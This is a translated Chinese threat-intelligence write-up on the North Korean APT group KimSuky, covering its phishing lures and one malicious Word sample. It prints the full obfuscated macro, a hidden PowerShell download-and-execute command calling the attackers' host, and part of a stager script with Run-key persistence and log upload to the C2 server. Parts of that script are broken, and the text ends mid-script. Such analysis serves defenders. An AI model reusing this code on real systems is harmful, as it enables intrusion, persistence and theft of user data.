# KimSuky各类攻击手法浅析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 概述
KimSuky是总部位于朝鲜的APT组织，根据卡巴的情报来看，至少2013年就开始活跃至今。该组织专注于针对韩国智囊团以及朝鲜核相关的目标。
KimSuky的ATT&CK图如下：
根据Mitre的ATTCK可以知道，KimSuky攻击的第一阶段基本是通过鱼叉攻击完成的，和大多数攻击的第一阶段相同，KimSuky的前置攻击也分为附件和邮件链接两种。
鱼叉攻击之后，紧接着是powershell的命令执行。根据笔者分析到的样本来看，附件攻击也好，链接攻击也好，大多数都是诱导用户下载并打开带有恶意宏代码的office文档执行恶意宏。恶意宏代码执行之后，通常会解密执行一段powershell指令进行后续的payload下载。
后续payload下载之后，KimSuky通常会通过注册表、启动目录、服务、注入Explorer等方式实现本地持久化。
此外，根据已有的样本来看，KimSuky还具备了关闭系统防火墙、禁用WindowsDefender、枚举磁盘等用于对抗检测的功能，具备删除已收集的数据文件的痕迹清理功能。
当一切准备方案就绪之后，KimSuky的马主要是窃取各大Web浏览器的凭证以及使用基于Powershell的键盘记录器收集用户的键盘输入。
关于数据加密，KimSuky主要是使用了RC4算法保护自己的数据。
关于命令分发，KimSuky拥有传统C2和魔改Teamview两种命令分发方式。
## 0x01 诱饵分析
根据红雨滴的Digital_Weapon和笔者之前接触到记录的KimSuky来看，部分具有诱惑性的文件名如下：
针对这些诱饵文件，中文翻译得到的词云大致如下：
## 0x02 样本分析
###  doc样本分析
原始样本md5为：772a5abc0e946230a50628db4a08dd80
上传VT的文件名为：학술회의 개최.doc  
译为：召开学术会议.doc
原始样本是一个带密码保护的office宏文档，和之前的一样，这里主要是解密执行一段Powershell代码：
完整宏代码如下
    Sub AutoOpen()
        asfwefsadfasfsadf
        dsfweqfasdfwqfsdaf
        asfwqfasfsdafas
        sdfqefsdafsadfwqefsadf
    End Sub
    Function dsfweqfasdfwqfsdaf()
        Dim qewrtredf(10) As String
        Dim vbNormalFocus As Integer
        vbNormalFocus = Right(Left("jfsklfkshsdf023jkjffkjfkjisfj23", 13), 1)
        qewrtredf(1) = "$+DC$+D:$+D\$+DW$+Di$+Dn$+Dd$+Do$+Dw$+Ds$+D\$+DS$+Dy$+Ds$+DW$+DO$+DW$+D$+D6$+D4$+D\$+DW$+Di$+Dn$+Dd$+Do$+Dw$+Ds$+DP$+Do$+Dw$+D$+De$+Dr$+DS$+Dh$+De$+Dl$+Dl$+D$+D\$+Dv$+D1$+D.$+D0$+D\$+Dp$+D$+Dow$+De$+Dr$+D$+Ds$+Dh$+De$+Dl$+Dl$+D.$+De$+Dx$+De$+D $+D-$+DW$+Di$+Dn$+Dd$+Do$+Dw$+DS$+Dt$+Dy$+Dl$+De"
        qewrtredf(2) = "$+D $+DH$+Di$+Dd$+Dd$+De$+Dn$+D $+D-$+Dc$+Do$+Dm$+Dm$+Da$+Dn$+Dd$+D $+D&$+D{$+D[$+Ds$+Dt$+Dr$+Di$+Dn$+Dg$+D]$$+Da$+D"
        qewrtredf(3) = "=$+D{$+D($+DN$+De$+Dw$+D-$+DO$+Db$+Dj$+De$+Dc$+Dt$+D $+DN$+De$+Dt$+D.$+DW$+De$+Db$+DC$+Dl$+Di$+De$+Dn$+Dt$+D)$+D."
        qewrtredf(4) = "$+DD$+Do$+D($+D'h$+Dt$+Dt$+Dp$+D:$+D/$+D/$+Dg$+Do$+Dl$+Dd$+Db$+Di$+Dn$+D.$+Dm$+Dy$+Da$+Dr$+Dt$+Ds$+Do$+Dn$+Dl"
        qewrtredf(5) = "$+Di$+Dn$+De$+D.$+Dc$+Do$+Dm$+D/$+Dl$+De$+D/$+Dyj$+D.$+Dt$+Dx$+Dt'$+D)"
        qewrtredf(6) = "$+D}$+D;$+D$$+Db$+D=$+D$$+Da$+D.$+Di$+Dn$+Ds$+De$+Dr$+Dt$+D($+D2$+D9$+D,$+D'$+Dw$+Dn$+Dl$+Do$+Da$+Dd$+DS$+Dt$+D"
        qewrtredf(7) = "r$+Di$+Dn$+Dg$+D'$+D)$+D;$+D$$+Dc$+D=$+Di$+De$+Dx$+D $+D$$+Db$+D;$+Di$+De$+Dx$+D $+D$$+Dc$+D}"
        iefkdfknfk = qewrtredf
        wrewsdfdsfsad = Join(iefkdfknfk, "")
        wrewsdfdsfsad = Replace(wrewsdfdsfsad, "$+D", "")
        qwersdfjoi = Shell(wrewsdfdsfsad, vbNormalFocus)
    End Function
    Function asfwefsadfasfsadf()
      Selection.Delete Unit:=wdCharacter, Count:=1
    End Function
    Function asfwqfasfsdafas()
        Selection.WholeStory
        With Selection.Font
            .NameFarEast = "讣篮 绊雕"
            .NameAscii = ""
            .NameOther = ""
            .Name = ""
            .Hidden = False
        End With
    End Function
    Function sdfqefsdafsadfwqefsadf()
        With Selection.ParagraphFormat
            .LeftIndent = CentimetersToPoints(2)
            .SpaceBeforeAuto = True
            .SpaceAfterAuto = True
        End With
        With Selection.ParagraphFormat
            .RightIndent = CentimetersToPoints(2)
            .SpaceBeforeAuto = True
            .SpaceAfterAuto = True
        End With
        Selection.PageSetup.TopMargin = CentimetersToPoints(2.5)
        Selection.PageSetup.BottomMargin = CentimetersToPoints(2.5)
    End Function
解密执行的Powershell指令如下
    "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -command &{[string]$a={(New-Object Net.WebClient).Do('http://goldbin.myartsonline.com/le/yj.txt')};$b=$a.insert(29,'wnloadString');$c=iex $b;iex $c}"
这里可以看到，Powershell的主要功能为下载一个文件到本地执行，下载文件的链接为：  
hxxp[:]//goldbin.myartsonline.com/le[/]yj.txt’
下载的yj.txt文件实质上是一个Powershell脚本，内容如下：
    $SERVER_ADDR = "http://goldbin.myartsonline.com/le/"
    $UP_URI = "post.php"
    $upName = "yj"
    $LocalID = "yj"
    $LOG_FILENAME = "Alzip.hwp"
    $LOG_FILEPATH = "\Alzip\"
    $TIME_VALUE = 1000*60*30
    $RegValueName = "Alzipupdate"
    $RegKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regValue = "cmd.exe / c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://goldbin.myartsonline.com/le/yj.txt')"
    function decode($encstr)
    $key = [byte[]](0,2,4,3,3,6,4,5,7,6,7,0,5,5,4,3,5,4,3,7,0,7,6,2,6,2,4,6,7,2,4,7,5,5,7,0,7,3,3,3,7,3,3,1,4,2,3,7,0,2,7,7,3,5,1,0,1,4,0,5,0,0,0,0,7,5,1,4,5,4,2,0,6,1,4,7,5,0,1,0,3,0,3,1,3,5,1,2,5,0,1,7,1,4,6,0,2,3,3,4,2,5,2,5,4,5,7,3,1,0,1,6,4,1,1,2,1,4,1,5,4,2,7,4,5,1,6,4,6,3,6,4,5,0,3,6,4,0,1,6,3,3,5,7,0,5,7,7,2,5,2,7,7,4,7,5,5,0,5,6)
    $len = $encstr.Length
    $j = 0
    $i = 0
    $comletter = ""
    while($i -lt $len)
    $j = $j % 160
    $asciidec = $encstr[$i] -bxor $key[$j]
    $dec = [char]$asciidec
    $comletter += $dec
    return $comletter
    function UpLoadFunc($logpath)
    $Url = $SERVER_ADDR + $UP_URI
    $bReturn = $True
    $testpath = Test-Path $logpath
    if($testpath -eq $False)
    return $bReturn
    $hexdata = [IO.File]::ReadAllText($logpath)
    $encletter = decode $hexdata
    $nEncLen = $encletter.Length
    $LF = "
    $templen = 0x100000
    $sum = 0
    $szOptional = ""
    $pUploadData = ""
    Start-Sleep -Milliseconds 100
    $readlen = $templen
    if (($nEncLen - $sum) -lt $templen)
    $readlen = $nEncLen - $sum
    if ($readlen -ne 0)
    $pUploadData = $encletter + $sum
    $sum += $readlen
    $pUploadData += "ending"
    $sum += 9
    $readlen = 6
    Start-Sleep -Milliseconds 1
    $boundary = "----WebKitFormBoundarywhpFxMBe19cSjFnG"
    $ContentType = 'multipart/form-data
    boundary=' + $boundary
    $bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data
    name=
    "MAX_FILE_SIZE
    "$LF",
    "10000000",
    "userfile
    filename=
    "$upName
    "Content-Type: application/octet-stream$LF",
    $pUploadData,
    "--$boundary"
    ) -join $LF
    $psVersion = $PSVersionTable.PSVersion
    $r = [System.Net.WebRequest]::Create($Url)
    $r.Method = "POST"
    $r.UseDefaultCredentials = $true
    $r.ContentType = $ContentType
    $enc = [system.Text.Encoding]::UTF8
    $data1 = $enc.GetBytes($bodyLines)
    $r.ContentLength = $data1.Length
    $newStream = $r.GetRequestStream()
    $newStream.Write($data1, 0, $data1.Length)